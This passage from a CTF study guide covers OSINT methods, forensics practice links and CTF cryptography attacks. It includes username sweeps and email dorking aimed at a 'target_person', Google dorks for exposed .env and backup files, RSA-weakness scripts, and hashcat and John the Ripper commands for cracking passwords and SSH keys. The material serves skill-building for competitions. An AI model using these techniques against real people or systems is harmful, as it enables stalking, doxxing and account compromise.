  → "FindAndOpen"       : zip cracking + forensics combo
  → "Eavesdropping"     : PCAP decryption
  → "Enhance!"          : image analysis, SVG
  → "Packets Primer"    : PCAP basics
  → "Operation Orchid"  : disk forensics + file carving
  → "Torrent Analyze"   : BitTorrent PCAP analysis

CyberDefenders (free, all forensics):
  https://cyberdefenders.org/blueteam-ctf-challenges/
  → "PacketMaze"    : PCAP analysis (Easy)
  → "Insider"       : disk forensics (Easy)
  → "Tomcat Takeover" : web server logs (Medium)
  → "PsExec Hunt"   : memory + network forensics (Medium)
  → "OpenWire"      : network protocol analysis (Medium)

HackTheBox Forensics Challenges (free challenges):
  https://app.hackthebox.com/challenges?category=forensics
  → "Illumination"     : git history forensics (Easy)
  → "Reminiscent"      : memory forensics (Easy)
  → "Emo"              : steganography (Easy)
  → "Alien Cradle"     : PowerShell forensics (Easy)
  → "Persistence"      : memory forensics (Easy)

BlueTeamLabs (free forensics labs):
  https://blueteamlabs.online/home/challenges
  → "Phishing Analysis" series (Email forensics)
  → "The Report"        : memory forensics
  → "Network Analysis - Web Shell" : PCAP + web

★★★ ADVANCED (Month 2-3):
━━━━━━━━━━━━━━━━━━━━━━━━━

CTFtime Writeups — search completed forensics CTFs:
  https://ctftime.org/writeups?tags=forensics
  Solve old challenges from:
  → UIUCTF (well-made forensics challenges)
  → NahamCon CTF (forensics category)
  → Securinets CTF
  → PicoCTF Hard section

ImaginaryCTF (monthly, archived):
  https://imaginaryctf.org/Challenges
  Filter by: Forensics, Medium/Hard difficulty

HackTheBox HARD forensics:
  → "Reminiscent" → "Relic Maps" → "Noted" → "Diagnostic"

★★★★ EXPERT (Month 3+):
━━━━━━━━━━━━━━━━━━━━━━━━

National Cyber League (seasonal, US):
  https://nationalcyberleague.org/
  → Log Analysis + Network Traffic + Digital Forensics categories

DFIR.training (specialized resources):
  https://www.dfir.training/

Memory Forensics: Volatility practice images:
  https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples
  Download samples → practice all Volatility3 plugins

AFTER SOLVING: Always write a brief writeup!
  Template: what was the challenge → what you tried → what worked → flag
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# PART 2 — OSINT

---

# Chapter 13: OSINT Theory {#ch13}

## 13.1 What Is OSINT?

```
OSINT = collecting intelligence from PUBLICLY AVAILABLE sources

THE KEY PRINCIPLE:
"Everything posted publicly is findable — even after deletion.
Caches, archives, screenshots, and search indexes preserve data forever."

THE OSINT LOOP:
  Collect → Analyze → Pivot → Collect again

"PIVOT" = every finding opens new search directions
  Username found → search every platform
  Email found    → search LinkedIn, breaches, GitHub
  Photo found    → reverse image search, EXIF GPS
  Domain found   → WHOIS, subdomains, Shodan, archives
```

## 13.2 OSINT Mindset

```
THINK LIKE A DETECTIVE:
1. What do I KNOW? (given data)
2. What do I NEED to find? (the goal)
3. What PATHS exist from known to needed?
4. Follow each path, document findings
5. CROSS-REFERENCE: one source ≠ proof; need confirmation

OSINT MISTAKES TO AVOID:
✗ Stopping because Google didn't find it first time
✗ Not using archive.org (deleted ≠ gone)
✗ Not trying multiple search engines (Bing, Yandex, Baidu are different!)
✗ Ignoring image metadata (EXIF GPS solves many geolocation challenges instantly!)
✗ Only using one tool (different tools = different results)
```

---

# Chapter 14: Person OSINT {#ch14}

## 14.1 Username Investigation

```bash
USERNAME="target_person"

# Sherlock — searches 400+ platforms automatically:
sherlock $USERNAME
sherlock $USERNAME --timeout 5 --print-found

# Manual platform checks (priority order):
PLATFORMS=(
    "https://twitter.com/$USERNAME"
    "https://github.com/$USERNAME"
    "https://reddit.com/user/$USERNAME"
    "https://instagram.com/$USERNAME"
    "https://linkedin.com/in/$USERNAME"
    "https://youtube.com/@$USERNAME"
    "https://hackthebox.com/profile/$USERNAME"
    "https://tryhackme.com/p/$USERNAME"
    "https://ctftime.org/user/$USERNAME"
    "https://keybase.io/$USERNAME"
)
for url in "${PLATFORMS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url")
    [ "$code" = "200" ] && echo "[FOUND] $url"
done

# Additional tools:
# WhatsmyName: https://whatsmyname.app/
# Namechk: https://namechk.com/
```

## 14.2 Email and Name Investigation

```bash
EMAIL="person@company.com"

# Google dorks:
# "$EMAIL" site:linkedin.com
# "$EMAIL" site:github.com
# intext:"$EMAIL" filetype:pdf

# Check if email in data breach:
# https://haveibeenpwned.com/ (HIBP API)

# Find emails for a domain:
theHarvester -d company.com -b google,bing,linkedin

# Name + company → find person:
# Google: "John Smith" site:linkedin.com "Company Name"
# Google: "John Smith" "Senior Engineer" "San Francisco"
```

---

# Chapter 15: Geolocation OSINT {#ch15}

## 15.1 How to Find Where a Photo Was Taken

```bash
# STEP 1: Check EXIF metadata first (30 second check!)
exiftool photo.jpg | grep -iE "GPS|Latitude|Longitude|Location"
# If GPS found → done! Paste into Google Maps.

# Convert DMS to decimal degrees:
python3 << 'EOF'
def dms_to_decimal(deg, min, sec, direction):
    d = deg + min/60 + sec/3600
    return -d if direction in ['S', 'W'] else d
# GPS Position: 51 deg 30' 26.47" N, 0 deg 7' 39.80" W
lat = dms_to_decimal(51, 30, 26.47, 'N')
lon = dms_to_decimal(0, 7, 39.80, 'W')
print(f"Google Maps: https://maps.google.com/?q={lat},{lon}")
EOF

# STEP 2: Reverse image search (if no GPS):
# Google Lens: https://lens.google.com/
# TinEye: https://tineye.com/
# Yandex Images: https://yandex.com/images/ (best for Eastern Europe/Russia)
# Bing Visual Search: https://www.bing.com/visualsearch

# STEP 3: Read environmental clues:
# Text/signs → identify language → narrow country
# License plates → https://www.worldlicenseplates.com/
# Vegetation → palm=tropical, birch=Northern Europe, eucalyptus=Australia
# Sun angle → determines hemisphere + rough time
# Architecture style → narrow to region/era
# Power lines → configuration differs by country!

# STEP 4: Verify on Google Street View
# https://www.google.com/maps → drop into street view → compare

# PRACTICE: GeoGuessr https://www.geoguessr.com/
```

---

# Chapter 16: Domain and IP OSINT {#ch16}

## 16.1 Domain Investigation

```bash
DOMAIN="target.com"

# Registration info:
whois $DOMAIN | grep -iE "name|email|registrar|created|expires"

# DNS records (each reveals something different!):
dig $DOMAIN A       # IP address
dig $DOMAIN MX      # Mail servers (reveals email provider: GSuite? Office365?)
dig $DOMAIN TXT     # SPF, DKIM, verification codes
dig $DOMAIN NS      # Nameservers (Cloudflare? AWS Route53?)
dig $DOMAIN CNAME   # Canonical names

# Subdomain discovery (find hidden services!):
# Method 1: Certificate transparency (MOST RELIABLE):
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" | \
    python3 -c "
import json,sys
data=json.load(sys.stdin)
seen=set()
for entry in data:
    for sub in entry.get('name_value','').split('\n'):
        sub=sub.strip()
        if sub not in seen and sub.endswith('.$DOMAIN'):
            print(sub); seen.add(sub)
"

# Method 2: gobuster DNS mode:
gobuster dns -d $DOMAIN \
    -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Shodan (find what services are exposed):
# https://www.shodan.io/ → search: hostname:target.com
# Shows: open ports, service versions, SSL certs

# Historical website:
curl -s "http://web.archive.org/cdx/search/cdx?url=$DOMAIN&output=text&limit=10"
# View old versions: https://web.archive.org/web/*/target.com

# Google dorking:
# site:$DOMAIN                  → all indexed pages
# site:$DOMAIN inurl:admin       → admin panels
# site:$DOMAIN filetype:pdf      → exposed documents
# site:$DOMAIN ext:log|bak|env   → sensitive files!
# cache:$DOMAIN                  → cached version
```

---

# Chapter 17: Social Media OSINT {#ch17}

## 17.1 Twitter/X and LinkedIn

```bash
# Twitter/X search operators:
# from:username        → tweets from user
# to:username          → tweets to user
# since:2020-01-01     → date filter
# geocode:lat,lon,10km → location-based
# filter:images        → with images
# Advanced: https://twitter.com/search-advanced

# Deleted tweets (check Wayback Machine!):
# https://web.archive.org/web/*/twitter.com/username

# LinkedIn dorking:
# site:linkedin.com/in "Company Name" "Job Title" "City"
# site:linkedin.com/in "Company Name" employees

# Check if Instagram profile exists:
curl -s "https://www.instagram.com/$USERNAME/" | \
    grep -o '"is_private":[a-z]*' | head -1

# Phone number OSINT:
# Truecaller: https://www.truecaller.com/
# Check Telegram: New Message → search phone
```

---

# Chapter 18: Image OSINT {#ch18}

## 18.1 Complete Image Investigation

```bash
# STEP 1: Always check EXIF first:
exiftool image.jpg | grep -iE "GPS|Location|Author|Comment|Software|Date"

# STEP 2: Reverse image search:
# Google Lens:  https://lens.google.com/
# TinEye:       https://tineye.com/      (finds exact copies)
# Yandex:       https://yandex.com/images/ (best for faces, Eastern Europe)
# Bing:         https://www.bing.com/visualsearch

# STEP 3: Photo forensics (detect edits):
# FotoForensics: https://fotoforensics.com/ (ELA analysis)
# Forensically:  https://29a.ch/photo-forensics/

# STEP 4: Read background carefully:
# Store signs → language → country
# License plates → https://www.worldlicenseplates.com/
# Reflections in glasses/windows → contains location!
# Shadows → direction + time of day

# STEP 5: Aircraft/vehicle tracking:
# FlightRadar24: https://www.flightradar24.com/
# MarineTraffic: https://www.marinetraffic.com/
# ADS-B: https://globe.adsbexchange.com/ (unfiltered!)
```

---

# Chapter 19: OSINT Practice Links — Easy to Hard {#ch19}

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OSINT PRACTICE LINKS: EASY → HARD
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

★ BEGINNER:
━━━━━━━━━━━

TryHackMe OSINT Rooms (free tier):
  → "OhSINT" (MOST RECOMMENDED FIRST — metadata + social media):
     https://tryhackme.com/room/ohsint
     Uses: exiftool → GPS → Twitter → Wigle WiFi
  → "Sakura Room" (username → accounts → location → crypto):
     https://tryhackme.com/room/sakura
  → "Google Dorking":
     https://tryhackme.com/room/googledorking
  → "OSINT Fundamentals":
     https://tryhackme.com/room/osintfundamentals

picoCTF OSINT Challenges (free, year-round):
  https://play.picoctf.org/practice?category=5
  → "Informations"   : metadata analysis
  → "where are the robots" : robots.txt OSINT
  → "Cookies"        : web OSINT on challenge website

GeoGuessr (geolocation practice):
  https://www.geoguessr.com/
  Play free daily challenge — 10 min/day builds location reading skills

Sofia Santos OSINT Challenges (free):
  https://gralhix.com/list-of-osint-exercises/
  → Excellent for GeoOSINT (find locations from photos)
  → IMINT (Image Intelligence) specific

★★ INTERMEDIATE:
━━━━━━━━━━━━━━━━

CTFlearn OSINT Category (free):
  https://ctflearn.com/challenge/browse?category=OSINT
  Work through 2-3 star challenges

NahamCon CTF — OSINT Category (archived):
  https://ctftime.org/event/1282  (search for NahamCon writeups)
  → Past challenges available, great quality

Trace Labs (unique — real missing persons OSINT!):
  https://www.tracelabs.org/
  → Free to join their CTF events
  → Real OSINT with real impact (help find missing people!)
  → Very rewarding + builds real skills

OpenCTI OSINT:
  https://ioc.exchange/ (OSINT community)

HackTheBox OSINT/Forensics (username/profile investigations):
  https://app.hackthebox.com/challenges?category=osint
  → "Hunting License" : profile investigation
  → "Leet Test"      : social media OSINT

GeoHints (reference for geolocation):
  https://geohints.com/
  → Study visual clues by country

★★★ ADVANCED:
━━━━━━━━━━━━━

Tracelabs OSINT CTF (when it runs):
  https://www.tracelabs.org/initiatives/search-party
  Full OSINT investigations

BellingCat OSINT Challenges:
  https://www.bellingcat.com/
  Read their investigations → try to replicate their methods

CTFtime OSINT search:
  https://ctftime.org/writeups?tags=osint
  Find writeups of past OSINT CTF challenges, replicate them

Sector 035 OSINT Quizzes:
  https://twitter.com/sector035 → OSINT Quiz series
  Weekly OSINT skill builders

★★★★ EXPERT:
━━━━━━━━━━━━

OSINT Curious:
  https://osintcurio.us/
  Advanced OSINT techniques and challenges

Maltego Community (relationship graph OSINT):
  https://www.maltego.com/community/

National OSINT Championship (when available):
  https://osintchampionship.com/
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# PART 3 — CRYPTOGRAPHY

---

# Chapter 20: Cryptography Theory {#ch20}

## 20.1 What Is Crypto in CTF?

```
CRYPTOGRAPHY IN CTF = Breaking things that should be secure

Key insight: Crypto CTF challenges are NOT about breaking AES or RSA
fundamentally. They're about finding IMPLEMENTATION MISTAKES:
  - Wrong mode used (ECB instead of CBC)
  - Key reused for multiple messages
  - Random number generator not truly random
  - Exponent too small (RSA e=3)
  - Password too weak (hash crackable)

CRYPTO CHALLENGE TYPES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TYPE            WHAT IT IS                DIFFICULTY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Encoding        Base64, Hex, Binary       ★ (trivial)
Classical       Caesar, ROT, Vigenère     ★★ (need tools)
Hash Cracking   MD5, SHA1 passwords       ★★ (need tools)
XOR             Single/multi-byte XOR     ★★★ (need Python)
RSA Attacks     Small e, bad primes       ★★★★ (need math)
AES Attacks     ECB, padding oracle       ★★★★ (need code)
Custom Crypto   Reverse algorithm         ★★★★★ (need RE)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FIRST TOOL TO USE: CyberChef "Magic" function
https://gchq.github.io/CyberChef/#recipe=Magic()
It auto-detects base64, hex, rot13, and 50+ other encodings.
Solves 40% of beginner crypto challenges instantly!
```

---

# Chapter 21: Classical Ciphers {#ch21}

## 21.1 Recognition and Breaking

```
CIPHER RECOGNITION CHEATSHEET:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PATTERN                      LIKELY CIPHER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KHOOR ZRUOG (letters shifted) Caesar / ROT (try all 26 shifts)
xzr qrfrag (A=N pattern)     ROT13
.... . .-.. .-.. ---          Morse code
8 5 12 12 15 (numbers)        A=1 B=2... substitution
PMYTS with repeating period   Vigenère cipher
ABCD EFGH (letter pairs)      Playfair cipher
♠♥♦♣ symbols                  Pigpen cipher / Symbol substitution
Zigzag/diagonal reading       Rail fence or transposition
QR code / barcode             Visual code
Binary 01010...               ASCII binary
Hex 48656c6c6f               Hex encoding
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

```python
#!/usr/bin/env python3
import codecs
from collections import Counter

# ── CAESAR BRUTE FORCE ───────────────────────────────────
def caesar_brute(ciphertext):
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    ct = ciphertext.lower()
    for shift in range(26):
        dec = ''.join(alpha[(alpha.index(c)-shift)%26] if c in alpha else c for c in ct)
        print(f"Shift {shift:2d}: {dec}")

caesar_brute("khoor zruog")  # Shift 3 → "hello world"

# ── ROT13 ─────────────────────────────────────────────────
print(codecs.encode("Uryyb Jbeyq", 'rot_13'))  # Hello World

# ── MORSE DECODER ────────────────────────────────────────
MORSE = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F',
         '--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L',
         '--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R',
         '...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X',
         '-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2',
         '...--':'3','....-':'4','.....':'5','-....':'6','--...':'7',
         '---..':'8','----.':'9'}
def morse_decode(s):
    return ' '.join(''.join(MORSE.get(c,'?') for c in w.split()) for w in s.split('   '))
print(morse_decode("... --- ..."))   # SOS

# ── A=1 NUMBER DECODE ─────────────────────────────────────
nums = "8 5 12 12 15"
print(''.join(chr(int(n)+64) for n in nums.split()))  # HELLO

# ── VIGENÈRE DECRYPT ─────────────────────────────────────
def vigenere_decrypt(ciphertext, key):
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    ct, k = ciphertext.lower(), key.lower()
    result, ki = '', 0
    for c in ct:
        if c in alpha:
            result += alpha[(alpha.index(c)-alpha.index(k[ki%len(k)]))%26]
            ki += 1
        else:
            result += c
    return result

# Find key length with Index of Coincidence:
def find_key_length(ct, max_len=20):
    ct = [c for c in ct.lower() if c.isalpha()]
    best_len, best_ioc = 1, 0
    for kl in range(2, max_len+1):
        iocs = []
        for i in range(kl):
            grp = ct[i::kl]
            n = len(grp)
            if n < 2: continue
            freq = Counter(grp)
            ioc = sum(f*(f-1) for f in freq.values()) / (n*(n-1))
            iocs.append(ioc)
        avg = sum(iocs)/len(iocs) if iocs else 0
        if avg > best_ioc:
            best_ioc, best_len = avg, kl
    return best_len

# Tools: dCode.fr has ALL classical ciphers + auto-solve!
# https://www.dcode.fr/cipher-identifier
```

---

# Chapter 22: Modern Symmetric Attacks {#ch22}

## 22.1 XOR — The Most Common CTF Crypto

```python
#!/usr/bin/env python3

# XOR PROPERTIES — MEMORIZE THESE:
# A XOR A = 0       (XOR with itself = zero)
# A XOR 0 = A       (XOR with zero = identity)
# C = P XOR K  →  P = C XOR K  (same operation decrypts!)
# C1 XOR C2 = P1 XOR P2  (key cancels when same key used!)

# ── SINGLE-BYTE XOR CRACKER ─────────────────────────────
def crack_single_xor(ciphertext):
    def score(text):
        common = b' eEtTaAoOiInNsShHrRlLdDcCuUmMwWfFgGyYpPbBvVkKjJxXqQzZ'
        return sum(1 for c in text if c in common)

    results = []
    for key in range(256):
        plain = bytes(b ^ key for b in ciphertext)
        results.append((score(plain), key, plain))

    results.sort(reverse=True)
    return results[0][1], results[0][2]  # best_key, best_plain

# Example:
ct = bytes([0x1b,0x37,0x37,0x33,0x31,0x3f,0x0f,0x45])
key, plain = crack_single_xor(ct)
print(f"Key: {key} (0x{key:02x})")
print(f"Plaintext: {plain}")

# ── KNOWN PLAINTEXT XOR KEY RECOVERY ─────────────────────
# If you know P1 starts with "CTF{":
ciphertext = bytes([0x18,0x16,0x02,0x0c,0x45,0x12,0x3f])
known = b'CTF{'
key_bytes = bytes(c ^ k for c, k in zip(ciphertext, known))
print(f"First key bytes: {key_bytes.hex()}")  # Recover key!

# ── KEY REUSE ATTACK ─────────────────────────────────────
# If same key encrypts two messages: C1 XOR C2 = P1 XOR P2
# Knowing P1 reveals P2!
def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

c1_xor_c2 = xor_bytes(c1, c2)    # Available
known_part = b"The secret"        # Known part of P1
p2_partial = xor_bytes(c1_xor_c2[:len(known_part)], known_part)
print(f"P2 fragment: {p2_partial}")

# ── AES ECB DETECTION ────────────────────────────────────
def detect_ecb(ciphertext):
    """ECB encrypts each 16-byte block independently.
    Same plaintext block → same ciphertext block!"""
    blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
    return len(blocks) != len(set(blocks))  # True = ECB!

# To detect: send 48 bytes of 'A', check if blocks are identical
# In requests: send AAAA...AAAA (48 chars) → check ciphertext
```

---

# Chapter 23: RSA Attacks {#ch23}

## 23.1 RSA Fundamentals and CTF Attacks

```
RSA RECAP:
  n = p × q  (two large primes)
  e = public exponent (usually 65537)
  d = private exponent (e⁻¹ mod φ(n))
  Encrypt: c = mᵉ mod n
  Decrypt: m = cᵈ mod n

  TO DECRYPT: need d. To get d: need φ(n). To get φ(n): need p and q!
  SECURITY: factoring n = p×q is computationally hard (for large n)

CTF ATTACKS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ATTACK                 CONDITION                 TOOL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FactorDB               n is known/small          factordb.com
Small e (e=3)          e small + short msg       cube root of c
Wiener's Attack        d too small               owiener library
Common Modulus         same n, different e       Extended Euclidean
GCD Attack             two n share factor p      gcd(n1, n2)
Fermat Factoring       p and q close together    isqrt attack
Hastad Broadcast       same m, e=3, 3 recipients CRT then cube root
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

```python
#!/usr/bin/env python3
from math import gcd, isqrt
from sympy import nextprime

# ── USE RsaCtfTool FIRST! ─────────────────────────────────
# git clone https://github.com/RsaCtfTool/RsaCtfTool
# python3 RsaCtfTool.py --publickey key.pem --uncipherfile cipher.txt
# python3 RsaCtfTool.py -n N -e E -c C --attack all

# ── FACTORDB LOOKUP ───────────────────────────────────────
# Visit: http://factordb.com/ → paste n → instant factors if known!

# ── DECRYPT ONCE YOU HAVE p, q ───────────────────────────
def rsa_decrypt(c, p, q, e):
    phi = (p-1)*(q-1)
    d = pow(e, -1, phi)
    m = pow(c, d, p*q)
    return m

def int_to_text(n):
    h = hex(n)[2:]
    if len(h) % 2: h = '0' + h
    return bytes.fromhex(h).decode('utf-8', errors='replace')

# ── GCD ATTACK (two n sharing factor) ────────────────────
def gcd_attack(n1, e1, c1, n2, e2, c2):
    p = gcd(n1, n2)
    if 1 < p < n1:
        q1 = n1 // p; q2 = n2 // p
        m1 = rsa_decrypt(c1, p, q1, e1)
        m2 = rsa_decrypt(c2, p, q2, e2)
        return int_to_text(m1), int_to_text(m2)
    return None

# ── FERMAT FACTORING (p and q close) ────────────────────
def fermat_factor(n):
    a = isqrt(n) + 1
    b2 = a*a - n
    while True:
        b = isqrt(b2)
        if b*b == b2:
            return a-b, a+b
        a += 1; b2 = a*a - n

# ── SMALL e=3 CUBE ROOT ───────────────────────────────────
def iroot(k, n):
    u, s = n, n+1
    while u < s:
        s = u
        t = (k-1)*s + n//pow(s, k-1)
        u = t//k
    return s

# If e=3 and m is small enough that m³ < n:
# c = m³ (no modular reduction!) → cube root of c = m!
def small_e_attack(c, e=3):
    m = iroot(e, c)
    return m  # verify: pow(m, e) == c

# ── WIENER ATTACK ────────────────────────────────────────
# pip3 install owiener
import owiener
d = owiener.attack(e, n)  # Returns d if small, else None
if d:
    m = pow(c, d, n)
    print(int_to_text(m))

# Hastad's Broadcast (same message, e=3, 3 different n):
from sympy.ntheory.modular import crt
def hastad(n_list, c_list):
    M, r = crt(n_list, c_list)
    return iroot(len(n_list), M)
```

---

# Chapter 24: Hash Cracking {#ch24}

## 24.1 Identifying and Cracking Hashes

```bash
# ── IDENTIFY HASH TYPE ────────────────────────────────────
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
hashid "5f4dcc3b5aa765d61d8327deb882cf99"

# Quick ID by length:
# 32 hex chars  → MD5 or NTLM
# 40 hex chars  → SHA1
# 64 hex chars  → SHA256
# 128 hex chars → SHA512
# $1$...        → MD5crypt
# $2a$/$2b$     → bcrypt
# $6$...        → SHA512crypt

# ── TRY ONLINE FIRST (instant, no computation!) ──────────
# CrackStation: https://crackstation.net/          ← best free db
# Hashes.com:   https://hashes.com/en/decrypt/hash
# MD5 online:   https://www.md5online.org/

# ── HASHCAT (GPU, fastest) ───────────────────────────────
# Basic dictionary attack:
hashcat -m 0    hash.txt rockyou.txt   # MD5
hashcat -m 100  hash.txt rockyou.txt   # SHA1
hashcat -m 1400 hash.txt rockyou.txt   # SHA256
hashcat -m 1000 hash.txt rockyou.txt   # NTLM
hashcat -m 3200 hash.txt rockyou.txt   # bcrypt (slow!)
hashcat -m 1800 hash.txt rockyou.txt   # SHA512crypt

# With mutation rules (password → P@$$w0rd, Password1, etc.):
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (short passwords):
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a   # 6 chars
hashcat -m 0 hash.txt -a 3 ?l?l?l?l        # 4 lowercase
# ?l=lower ?u=upper ?d=digit ?s=symbol ?a=all

# Show cracked:
hashcat -m 0 hash.txt --show

# ── JOHN THE RIPPER ──────────────────────────────────────
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=rockyou.txt --rules
john hash.txt --show

# Special formats:
zip2john file.zip > hash.txt && john hash.txt --wordlist=rockyou.txt
ssh2john id_rsa > hash.txt && john hash.txt --wordlist=rockyou.txt
pdf2john file.pdf > hash.txt && john hash.txt

# Hashcat mode reference:
# 🔗 https://hashcat.net/wiki/doku.php?id=hashcat
```

---

# Chapter 25: Encoding vs Encryption {#ch25}

## 25.1 Complete Encoding Reference

```bash
# ENCODING ≠ ENCRYPTION! (encoding has no key — anyone can decode!)
# CyberChef Magic handles most automatically:
# https://gchq.github.io/CyberChef/#recipe=Magic()

# ── QUICK DECODE TABLE ────────────────────────────────────

# BASE64 (A-Za-z0-9+/=):
echo "SGVsbG8=" | base64 -d

# BASE32 (A-Z2-7=):
echo "JBSWY3DPEB3W64TMMQ======" | base32 -d

# HEX (0-9a-f):
echo "48656c6c6f" | xxd -r -p
python3 -c "print(bytes.fromhex('48656c6c6f').decode())"

# BINARY (only 0s and 1s):
python3 -c "
b='01001000 01100101 01101100 01101100 01101111'
print(''.join(chr(int(x,2)) for x in b.split()))"

# DECIMAL ASCII (32-126):
python3 -c "print(''.join(chr(int(n)) for n in '72 101 108 108 111'.split()))"

# ROT13 (letters only, shift by 13):
python3 -c "import codecs; print(codecs.encode('Uryyb Jbeyq','rot_13'))"

# URL ENCODED (%XX):
python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6c%6c%6f'))"

# HTML ENTITIES (&lt; &gt; &#65;):
python3 -c "import html; print(html.unescape('&lt;script&gt;&#65;'))"

# MORSE (. and -):
MORSE = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F',
         '--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L',
         '--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R',
         '...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X',
         '-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2',
         '...--':'3','....-':'4','.....':'5','-....':'6','--...':'7',
         '---..':'8','----.':'9'}
# Decode: separate words with 3 spaces, letters with 1 space

# NATO PHONETIC (Alpha Beta Charlie...):
NATO = {'Alpha':'A','Bravo':'B','Charlie':'C','Delta':'D','Echo':'E',
        'Foxtrot':'F','Golf':'G','Hotel':'H','India':'I','Juliet':'J',
        'Kilo':'K','Lima':'L','Mike':'M','November':'N','Oscar':'O',
        'Papa':'P','Quebec':'Q','Romeo':'R','Sierra':'S','Tango':'T',
        'Uniform':'U','Victor':'V','Whiskey':'W','Xray':'X','Yankee':'Y','Zulu':'Z'}
msg = "Hotel Echo Lima Lima Oscar"
print(''.join(NATO.get(w,w) for w in msg.split()))  # HELLO

# AUTO-DETECT AND TRY ALL:
python3 << 'EOF'
import base64, codecs, urllib.parse, html

def try_all(text):
    attempts = [
        ('Base64', lambda s: base64.b64decode(s+'==').decode()),
        ('Base32', lambda s: base64.b32decode(s+'='*((8-len(s)%8)%8)).decode()),
        ('Hex', lambda s: bytes.fromhex(s).decode()),
        ('ROT13', lambda s: codecs.encode(s,'rot_13')),
        ('URL', lambda s: urllib.parse.unquote(s)),
        ('HTML', lambda s: html.unescape(s)),
    ]
    for name, fn in attempts:
        try:
            result = fn(text.strip())
            if result and result.isprintable():
                print(f"[{name}] {result[:80]}")
        except: pass

try_all("SGVsbG8gV29ybGQh")
EOF
```

---

# Chapter 26: Crypto Practice Links — Easy to Hard {#ch26}

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CRYPTOGRAPHY PRACTICE LINKS: EASY → HARD
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

★ BEGINNER (start here, first 2 weeks):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

picoCTF Cryptography (free, always available):
  https://play.picoctf.org/practice?category=2
  Start with these in order:
  → "caesar"           : Caesar cipher, brute all 26 shifts
  → "Mod 26"           : ROT13
  → "The Numbers"      : Numbers = letters (A=1)
  → "13"               : ROT13 again
  → "Vigenere"         : Vigenère cipher with given key
  → "Easy1"            : OTP (one-time-pad) with table
  → "Pixelated"        : XOR two images
  → "spelling-quiz"    : substitution cipher
  → "Dachshund Attacks": RSA with small private key
  → "Mind your Ps and Qs" : RSA with small prime factors
  → "Sum-O-Primes"     : RSA, recover from n and p+q
  → "Custom encryption" : custom XOR cipher, reverse it
  → "flag_shop"        : modular arithmetic vulnerability

TryHackMe Crypto Rooms (free tier):
  → "Cryptography for Complete Beginners":
     https://tryhackme.com/room/cryptographyintro
  → "Hashing - Crypto 101":
     https://tryhackme.com/room/hashingcrypto101
  → "Encryption - Crypto 101":
     https://tryhackme.com/room/encryptioncrypto101

CyberChef Practice (online, no install):
  https://gchq.github.io/CyberChef/
  Exercise: Try the "Magic" function on these test strings:
  → "SGVsbG8gV29ybGQh"
  → "48656c6c6f20576f726c6421"
  → "01001000 01100101 01101100 01101100 01101111"
  → "Uryyb Jbeyq"
  Learn to recognize what each encoding looks like.

CTFlearn Cryptography (free):
  https://ctflearn.com/challenge/browse?category=Cryptography
  Start 1-star → 2-star challenges

★★ INTERMEDIATE (Week 3-6):
━━━━━━━━━━━━━━━━━━━━━━━━━━━

CryptoHack (THE best free crypto platform!):
  https://cryptohack.org/
  Interactive, gamified cryptography learning.
  Start with "Introduction" (completely free):
  → https://cryptohack.org/challenges/introduction/
    Covers: encoding, XOR, hex, base64, bytes — all fundamentals
  Then "General" section:
  → RSA basics, modular arithmetic
  Then "Symmetric Cryptography":
  → AES ECB attacks, CBC bit-flip
  → Padding oracle attacks
  Then "RSA" section:
  → Small e, Wiener's attack, broadcasting
  CryptoHack is ESSENTIAL — 100+ challenges, all crypto!

